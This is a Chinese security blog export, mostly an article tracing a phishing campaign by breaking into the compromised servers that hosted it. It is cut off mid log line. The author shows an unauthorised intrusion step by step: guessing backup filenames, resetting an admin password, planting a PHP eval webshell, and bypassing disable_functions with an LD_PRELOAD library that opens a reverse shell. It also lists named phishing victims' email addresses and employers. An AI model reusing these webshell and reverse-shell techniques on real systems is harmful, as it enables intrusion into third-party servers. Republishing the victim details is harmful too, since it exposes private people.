//获得root flag  \nsystemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid\n","date":"2020-04-03","permalink":"https://xeye.io/post/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/","tags":["靶机"],"title":"靶机渗透测试 TryHackMe:Vulnversity"},{"content":" 声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。\n 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。\n 二、信息收集 这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件：\n2.1 邮件正文： Received: from sysmailout1.platon.sk (unknown [85.248.228.17]) by bizmx16.qq.com (NewMx) with SMTP id for \u0026lt;test@test.cn\u0026gt;; Thu, 29 Nov 2018 06:56:41 +0800 X-QQ-SPAM: true X-QQ-FEAT: jfJxHuYZxOCSeMM7azx75jXNlqmrApsudtGuMpkas54ZAC17UV7M4b/R5+7i0 PKMg4QGPsKjsZDM+XUXd0s8kb9W0jCArNfxa3+HTU9vKECwH9fbHyzA2+de0ctDM9+ziJ5w 1BJI2Ppc9DVh5DYSq8ySLhcBVRj6sBsJefxrSztWrgzKi58wWFCv7LPgqOAXS+VVMyVipbT fHFacZXmdB00T62nXv8xQociZvHE+8ELBoHVgcA3ZWA7p4no8o1e0Z8ShUvX2P5FwhvXPLZ QUg8HNiMhXk5NEtQVC0Y7R9JwKV2VeKybQbg== X-QQ-MAILINFO: Mms3jrkBGwMrz972clMUbgsPqZ0t5EGjrqWV2rMFcEfTT5Y9lunbPCtSM 4HaaK+iUBVTvuth5bvdEvVKkuiTcOnkJ0t3khnTYcRGfQmEIZI+ZrNXlT/8QxjWMjOsiHkK yGbgfv5Gx9Qr65abnNzXymg= X-QQ-mid: bizmx16t1543445804ti4ex7suw X-QQ-CSender: www-data@m7web1.platon.sk X-QQ-ORGSender: www-data@m7web1.platon.sk X-KK-mid:bizmxp6t1543445804t9ne878su Received: from m7web1.platon.sk (m7web1.platon.sk [85.248.229.150]) by sysmailout1.platon.sk (Postfix) with ESMTP id 8EFCC217002E for \u0026lt;test@test.cn\u0026gt;; Wed, 28 Nov 2018 23:56:38 +0100 (CET) Received: by m7web1.platon.sk (Postfix, from userid 33) id 89364400A3A1; Wed, 28 Nov 2018 23:56:38 +0100 (CET) To: test@test.cn Subject: =?UTF-8?Q?Password_expiry_notice?= Date: Wed, 28 Nov 2018 23:56:38 +0100 From: =?UTF-8?Q?Microsoft_Online_Services_Team?= \u0026lt;no-response@365.mirohaviar.sk\u0026gt; Message-ID: \u0026lt;0a9ee06dc11866565f0302302c647c7a@www.mirohaviar.sk\u0026gt; X-Priority: 3 MIME-Version: 1.0 Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset=\u0026quot;us-ascii\u0026quot; 略... \u0026lt;br\u0026gt;The password for the Microsoft 365 account\u0026lt;span style=3D\u0026quot;font-weight: b= old;\u0026quot;\u0026gt; test@test.cn \u0026lt;/span\u0026gt; has expired.\u0026lt;br\u0026gt;![mir-nc.png-57.1kB][2] \u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;br\u0026gt;To protect your Microsoft = account, your existing password may cease to work shortly.\u0026lt;br\u0026gt; \u0026lt;br\u0026gt; You are now required to \u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;a hre= f=3D\u0026quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest@= test.cn \u0026quot;\u0026gt;\u0026lt;span style=3D\u0026quot;font-weight: bold;\u0026quot;\u0026gt;change your password\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; immediateIy.\u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt; \u0026lt;br\u0026gt; =2E\u0026lt;/span\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=3D\u0026quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest=@test.cn 略...  2.2 分析邮件内容 根据邮件内容得到的信息如下：\n 钓鱼网站： [www.rosturplast.com（137.74.81.5 法国）\n钓鱼链接: http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn\n发件地址： no-response@365.mirohaviar.sk\n服务商： Platon Technologies, s.r.o （斯洛伐克） SMTP： sysmailout1.platon.sk （85.248.228.17 斯洛伐克）\n  三、渗透钓鱼网站 3.1 漏洞分析  目标网站：www.rosturplast.com\n 访问钓鱼链接，一个克隆OWA修改密码的的虚假页面，我们按照正常流程走一遍，密码随便输入。不出所料页面提示密码错误，这么做可以收集受害者多个密码提高成功率，仔细想想这个功能还是很贴心的：）。\nStep 1\nStep 2\nStep 3\n 抓包如下： 注入、跨站之流都是不存在的。\n访问首页，这是一家俄罗斯的塑料水管厂商，攻击者入侵了这个网站，放置了钓鱼页面，再通过邮件传播。\n端口扫描显示开放了一堆端口，防火墙做了策略限制。\n通过扫描分析，得到沦陷主机信息如下:\n [+] HOST: www.rosturplast.com （137.74.81.5 法国）\n[+] OS: Red Hat 4.8\n[+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16\n[+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）\n 这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。\n扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。\n机智的我（此时毫无办法），开始挂字典整合Joomla目录盲扫备份文件，最后发现目标存在PhpMyAdmin后台，和一个报错页面，页面显示了网站绝对路径和疑似以日期格式生成的网站备份的文件名。\n/var/www/rosturpl/data/www/rosturplast.com/rosturplast.com.2015-11-11.zip  3.2 陷入僵局 尝试下载这个文件，http响应404。看了一下同站有多个站点，但旁站渗透是个体力活，国外这种典型的CloudLinux+cPanel的架构不好提权。到这一步陷入了僵局，睡个午觉养养神，下午继续研究。\nwget http://www.rosturplast.com/rosturplast.com.2015-11-11.zip 错误 404：Not Found  3.3 后台提权 不到万不得已，不从旁站和C段入手，稍加思索根据报错页面的备份文件名格式生成日期文件，尝试遍历日期下载，碰碰运气。\n脚本内容：\n#!/bin/bash startdate=`date -d \u0026quot;+0 day $1\u0026quot; +%Y%m%d` enddate=`date -d \u0026quot;+0 day $2\u0026quot; +%Y%m%d` while [[ $startdate -le $enddate ]] do date=$startdate startdateother=`date -d \u0026quot;+0 day $date\u0026quot; +%Y-%m-%d` dateother=$startdateother url=http://www.rosturplast.com/rosturplast.com.$dateother.zip echo \u0026quot;$url\u0026quot; startdate=`date -d \u0026quot;+1 day $date\u0026quot; +%Y-%m-%d` startdateother=`date -d \u0026quot;+1 day $date\u0026quot; +%Y-%m-%d` wget $url done  脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。\n查看配置文件configuration.php得到数据库连接信息，登录PhpMyAdmin后台。低权限无法直接写shell，只能修改默认密码登录Joomla!后台。\npublic $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'user***'; //敏感信息打码 public $password = 'K********6759'; //敏感信息打码 public $db = 'rtp_com3'; public $dbprefix = 'ms8ef_'; public $live_site = ''; public $secret = '5qp******4zU'; //敏感信息打码  备份原始密文以备还原，将后台密码修改为 test123456XYZ\nhttp://www.rosturplast.com/administrator/ admin / test123456XYZ  登录后台，通过模板写入WebShell\n Extensions \u0026mdash;\u0026gt; Template Manager \u0026mdash;\u0026gt; Template \u0026mdash;\u0026gt; New Files \u0026mdash;\u0026gt; PHP WebSehll\n 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。\n\u0026lt;?php @eval($_POST['cmd']);?\u0026gt;  查看攻击者的钓鱼文件目录，user.txt 详细记录了上钩的受害者信息。 3.4 日志分析 将网站文件和访问日志下载到本地分析\n[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/log.tar.gz /var/www/rosturpl/data/access-logs /var/www/rosturpl/data/logs/rosturplast* [/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/www.tar.gz --exclude=/var/www/rosturpl/data/www/rosturplast.com/www.tar.gz /var/www/rosturpl/data/www/rosturplast.com/ wget -c http://www.rosturplast.com/log.tar.gz \u0026amp;\u0026amp; wget -c http://www.rosturplast.com/www.tar.gz ⚡ root@kali  /tmp  gzip -d *.gz ⚡ root@kali  /tmp  ls -lh 总用量 22M -rw-r----- 1 48 6313 392K 11月 30 16:19 rosturplast.com.access.log -rw-r----- 1 48 6313 418K 11月 21 08:08 rosturplast.com.access.log-20181121 -rw-r----- 1 48 6313 315K 11月 22 08:27 rosturplast.com.access.log-20181122 -rw-r----- 1 48 6313 367K 11月 23 08:08 rosturplast.com.access.log-20181123 -rw-r----- 1 48 6313 332K 11月 24 08:20 rosturplast.com.access.log-20181124 -rw-r----- 1 48 6313 394K 11月 25 08:30 rosturplast.com.access.log-20181125 -rw-r----- 1 48 6313 217K 11月 26 08:27 rosturplast.com.access.log-20181126 -rw-r----- 1 48 6313 338K 11月 27 08:07 rosturplast.com.access.log-20181127 -rw-r----- 1 48 6313 1.8M 11月 28 08:35 rosturplast.com.access.log-20181128 -rw-r----- 1 48 6313 2.3M 11月 29 08:38 rosturplast.com.access.log-20181129 -rw-r----- 1 48 6313 6.4M 11月 30 08:38 rosturplast.com.access.log-20181130 -rw-rw---- 1 48 6313 267K 11月 30 16:00 rosturplast.com.error.log -rw-rw---- 1 48 6313 3.8K 11月 21 03:44 rosturplast.com.error.log-20181121 -rw-rw---- 1 48 6313 1.9K 11月 21 14:43 rosturplast.com.error.log-20181122 -rw-rw---- 1 48 6313 1.9K 11月 23 02:30 rosturplast.com.error.log-20181123 -rw-rw---- 1 48 6313 5.0K 11月 24 01:46 rosturplast.com.error.log-20181124 -rw-rw---- 1 48 6313 8.3K 11月 25 02:07 rosturplast.com.error.log-20181125 -rw-rw---- 1 48 6313 2.3K 11月 26 05:05 rosturplast.com.error.log-20181126 -rw-rw---- 1 48 6313 4.1K 11月 27 05:34 rosturplast.com.error.log-20181127 -rw-rw---- 1 48 6313 550K 11月 28 08:35 rosturplast.com.error.log-20181128 -rw-rw---- 1 48 6313 6.5M 11月 29 07:51 rosturplast.com.error.log-20181129 -rw-rw---- 1 48 6313 1.4M 11月 30 08:38 rosturplast.com.error.log-20181130  用D盾扫网站文件，发现这个网站已成跑马场。\n攻击者在shells/目录下放置钓鱼文件和PHP后门。\n查看哪些IP访问了后门并统计次数\n查询攻击者IP地址\n ⚡ root@kali  /tmp/rosturplast.com/log  grep \u0026quot;/shells/\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 26 174.85.145.99 20 50.73.252.169 10 213.233.104.120 2 207.228.149.69 2 195.211.23.207 2 129.205.113.8 ⚡ root@kali  /tmp/rosturplast.com/log  for line in $(\u0026lt;ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 174.85.145.99 来自: 美国 IP: 50.73.252.169 来自: 美国 IP: 213.233.104.120 来自: 罗马尼亚 IP: 207.228.149.69 来自: 百慕大 IP: 195.211.23.207 来自: 俄罗斯 IP: 129.205.113.8 来自: 尼日利亚  根据后门文件名，匹配Apache访问日志得到攻击者的代理IP和User Agent\n ⚡ root@kali  /tmp  grep \u0026quot;/shells\u0026quot; *| grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 129.205.113.8 - - [30/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\u0026quot; 174.85.145.99 - - [27/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 207.228.149.69 - - [28/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 213.233.104.120 - - [27/Nov/2018//www.rosturplast.com/shells//bacu.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv 50.73.252.169 - - [29/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;  通过日志匹配邮箱并去重得到受害者邮箱地址\negrep '[0-Z_]{1,}@[0-Z]{1,}(\\.[0-Z]{1,})+' * | awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |awk -F \u0026quot;HTTP\u0026quot; '{print $1}' |awk -F \u0026quot;ml=\u0026quot; '{print $2}' |sort |uniq ⚡ root@kali  /tmp  egrep '[0-Z_]{1,}@[0-Z]{1,}(\\.[0-Z]{1,})+' * | awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |awk -F \u0026quot;HTTP\u0026quot; '{print $1}' |awk -F \u0026quot;ml=\u0026quot; '{print $2}' |sort |uniq alexsin54@yahoo.com //攻击者邮箱 clavenda.payman@lbdi.net //利比亚发展投行CFO dennis@rayfields.co.za //域名失效 georges.raad@nera.net //新加坡IT基础设施提供商员工 gthakkar@sscinc.com //美国SS\u0026amp;C Technologies, Inc. （印度分公司） jasonchowan223@gmail.com //攻击者邮箱 ******@******.com //同事 jiajie.lim@cimb.com //马来西亚联昌国际银行员工 kohchinbeng@bdo.com.sg //新加坡立信会计师事务所员工 mayfaithlee@hotmail.com //未知 philip@beekoo.hk //深圳市很有蜂格网络科技有限公司CEO Point72.IR@sscinc.com //美国SS\u0026amp;C Technologies, Inc. shunweicapital@sscinc.com //美国SS\u0026amp;C Technologies, Inc.（疑似顺为资本） url@email.com //无效   3.5 受害者身份识别 通过搜索引擎对这15个受害者邮箱进行身份识别。\n3.5.1 alexsin54@yahoo.com / jasonchowan223@gmail.com   alexsin54@yahoo.com：攻击者欺诈账户，曾被举报过，在这里攻击者用来作钓鱼测试。 jasonchowan223@gmail.com：通过钓鱼程序配置文件获得。 ./logon.secureaccess/mail.php:$mail=\u0026quot;jasonchowan223@gmail.com\u0026quot;;\n    来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/\n  3.5.2 clavenda.payman@lbdi.net   Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf\u0026amp;chemin=\u0026amp;id=91\n  3.5.3 georges.raad@nera.net   疑似新加坡 Nera Telecommunications Ltd（IT基础设施提供商）公司员工 来源：http://www.nera.net/about-us.html\n  3.5.4 gthakkar@sscinc.com   美国SS\u0026amp;C Technologies, Inc. \u0026amp; 印度金融服务公司 Globeop Financial Services Technologies (India) Private Limited 来源：https://www.instafinancials.com/company/globeop-financial-services-india-private-limited/U67100MH2003PTC141044\n    来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](http://www.seepz.gov.in/writereaddatafolder/Regional Governing Council of EPCES for 2016-18.pdf)\n  3.5.5 jiajie.lim@cimb.com   马来西亚联昌国际银行员工（CIMB Group） 来源：https://www.cimb.com/en/who-we-are.html\n  3.5.6 kohchinbeng@bdo.com.sg   KOH CHIN BENG 新加坡立信会计师事务所员工\n    来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng\n  3.5.7 philip@beekoo.hk   深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659\n  四、渗透邮件发送网站  目标：mirohaviar.sk ，这是一个博客网站\n  4.1 漏洞扫描 服务器信息如下:\n [+] HOST: mirohaviar.sk（85.248.229.150 斯洛伐克） [+] OS: Debian 7 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 [+] CMS: Joomla 1.5\n CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。\n然而有人的地方就有江湖，有黑客入侵过的网站一定有后门。这类利用通用漏洞批量入侵的黑客团伙，后门文件一般都有特征，我根据前一个网站获得的php后门文件名列表，批量访问当前网站得到了三个相同的后门文件。\n ⚡ root@kali  /tmp/rosturplast.com/webroot/shells  md5sum * 724e7316427151ea1f449f38a28f642c 406.php 3e8a7cf7049e8b9ab8dfca7d3c827c4a aaaa aaf775b99997c166ff45677806d809de an.php e5c06f1f66781ba5c39d909096c4cd47 a.txt f71ad06982064b125d155b6f601198b8 bacu.php f2d7553b97d8e0a0258e48c3ca42a7d2 baer.php c01a0691c484a8d00977a100d8706b50 cfg.php e5c06f1f66781ba5c39d909096c4cd47 config.php md5sum: logon.secureaccess: 是一个目录 983ba05973b84e33e76916ca0dabedec new2bug.txt 1c014f955a67974dc779100c13162f1a priv8.php 2a73dda7ebb3b8d1c0d094b79623e9ff setup.php 80b5dadd0a9856f1e6d950843140d24e switch-security.php 48f50fb676028e0ae82f3f2db4e26247 unzipper.php 51f0bba7ec30b8778dca19ead016a58f webapp365.zip 58d1d66c0be0739319156702522b1b52 wso.php  相同文件名如下：\nhttp://www.mirohaviar.sk/config.php http://www.mirohaviar.sk/an.php http://www.mirohaviar.sk/bacu.php Pro Mailer V2  其中 http://www.mirohaviar.sk/config.php 是攻击者的加密WebShell，理论上只需解密获得密码就能登录这个后门。\n 4.2 解密WebShell 解密过程如下\nawk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php //去除头尾多余字符，得到base64密文。 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' //第一次base64解码，得到16进制密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p //第二次hex解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' //第三次base64解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' //第四次base64解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i //第五次base64解码，得到明文  得到后门密码hash（MD5），解密后得到明文: root （饶了个大弯原来是个弱口令，下次遇到这类先跑一下密码）\n$auth_pass = \u0026quot;63a9f0ea7bb98050796b649e85481845\u0026quot;;  这个后门有点皮，做了UserAgent判断，我浏览器默认设置的UA是Googlebot，访问显示404，这是反搜索引擎爬虫的惯用手段，所以我换了个正常浏览器的UA访问得到正常页面。\nif(!empty($_SERVER['HTTP_USER_AGENT'])) { $userAgents = array(\u0026quot;Google\u0026quot;, \u0026quot;Slurp\u0026quot;, \u0026quot;MSNBot\u0026quot;, \u0026quot;ia_archiver\u0026quot;, \u0026quot;Yandex\u0026quot;, \u0026quot;Rambler\u0026quot;); if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); exit; } }   4.3 提权 通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。\n4.3.1 突破disable_functions 测试发现目标限制跨目录（open_basedir），并禁用了命令执行函数，导致WebShell权限下，无法跨目录访问也无法执行命令。\ndisable_functions：\tescapeshellarg,escapeshellcmd,exec,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec\topen_basedir：\t/storage/www/mirohaviar.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/   突破的手段很多，这里我利用LD_PRELOAD动态链接来劫持php的mail函数突破disable_functions执行系统命令。\n 查看sendmail函数在执行过程中动态调用哪些标准库函数。\nwww-data@m7web1:/tmp$ readelf -Ws /usr/sbin/sendmail Symbol table '.dynsym' contains 420 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __printf_chk@GLIBC_2.3.4 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getegid@GLIBC_2.2.5 (3) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dane_raw_tlsa@DANE_0_0 (4) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_ocsp_resp_print@GNUTLS_3_4 (5) 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_x509_crt_get_serial@GNUTLS_3_4 (5) 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __errno_location@GLIBC_2.2.5 (3) 7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_db_set_cache_expiration@GNUTLS_3_4 (5) 8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND sendto@GLIBC_2.2.5 (3) ...... 76: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getuid@GLIBC_2.2.5 (3) 77: 0000000000000000 0 FUNC GLOBAL DEFAULT UND send@GLIBC_2.2.5 (3)  从中选取geteuid函数进行测试，编写动态链接程序bypass.c\n#include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; void payload() { system(\u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/999 0\u0026gt;\u0026amp;1\u0026quot;); } int geteuid() { if(getenv(\u0026quot;LD_PRELOAD\u0026quot;) == NULL) { return 0; } unsetenv(\u0026quot;LD_PRELOAD\u0026quot;); payload(); }  当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令调用system执行一个反弹shell的操作（xxx.xxx.xxx.xxx即是我的公网服务器IP）\n编译\ngcc -c -fPIC bypass.c -o bypass gcc -shared bypass.c -o bypass.so  上传\nwww-data@m7web1:/tmp$ cat b64.txt|base64 -d \u0026gt;bypass.so www-data@m7web1:/tmp$ file bypass.so file bypass.so bypass.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)  执行\nbypass.php\n\u0026lt;?php putenv(\u0026quot;LD_PRELOAD=/tmp/bypass.so\u0026quot;); mail(\u0026quot;test@localhost\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;); ?\u0026gt;  浏览器访问http://www.mirohaviar.sk/bypass.php页面后成功执行命令，得到了一个www-user权限的反弹shell。\n4.3.2 发现行踪 仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录/var/log/apache2/无权限访问。\n不过我在/tmp目录下面发现了一个有趣的日志文件。\n[/tmp/]$cat w --2018-11-26 04:49:06-- http://187.85.134.4/cacat/mm.tgz Connecting to 187.85.134.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 769309 (751K) [application/x-gzip] Saving to: 'mm.tgz' 0K .......... .......... .......... .......... .......... 6% 174K 4s 50K .......... .......... .......... .......... .......... 13% 176K 4s 100K .......... .......... .......... .......... .......... 19% 14.1M 2s 150K .......... .......... .......... .......... .......... 26% 353K 2s 200K .......... .......... .......... .......... .......... 33% 353K 2s 250K .......... .......... .......... .......... .......... 39% 19.8M 1s 300K .......... .......... .......... .......... .......... 46% 355K 1s 350K .......... .......... .......... .......... .......... 53% 28.7M 1s 400K .......... .......... .......... .......... .......... 59% 23.6M 1s 450K .......... .......... .......... .......... .......... 66% 344K 1s 500K .......... .......... .......... .......... .......... 73% 18.0M 0s 550K .......... .......... .......... .......... .......... 79% 360K 0s 600K .......... .......... .......... .......... .......... 86% 20.4M 0s 650K .......... .......... .......... .......... .......... 93% 20.2M 0s 700K .......... .......... .......... .......... .......... 99% 12.7M 0s 750K . 100% 2438G=1.3s 2018-11-26 04:49:10 (577 KB/s) - 'mm.tgz' saved [769309/769309]  4.4 追踪 根据泄露日志，使用谷歌搜索关键字：http://187.85.134.4，发现了一个历史页面。 这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： inurl:bc.php?filesrc=，得到了多条后门记录。\n其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber ，表明后门均为这个黑客组织所有。\n进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。\n 4.5 提取日志 我提取了其中几个被入侵网站的访问日志。\n4.5.1 网站：www.radiolanalhue.cl 打包\ntar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz --exclude=/home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz /home/radiolanalhue/public_html/ tar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.log.tar.gz /home/radiolanalhue/logs/radiolanalhue.cl-ssl_log-Nov-2018.gz /home/radiolanalhue/access-logs/ /home/radiolanalhue/access-logs/radiolanalhue.cl  下载\nwget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.tar.gz wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.log.tar.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ✘ ⚡ root@kali  /tmp/radiolanalhue.cl/log/  grep \u0026quot;/beez5/\u0026quot; radiolanalhue.cl-Dec-2018 疑似攻击者代理IP： 212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026quot; 谷歌爬虫： 66.249.66.149 - - [01/Dec/2018:00:53:57 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot; 66.249.66.151 - - [01/Dec/2018:06:34:34 -0300] \u0026quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/favicon.ico\u0026amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1\u0026quot; 200 2348 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot; 66.249.66.153 - - [01/Dec/2018:06:51:46 -0300] \u0026quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/component.php\u0026amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1\u0026quot; 200 5456 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile 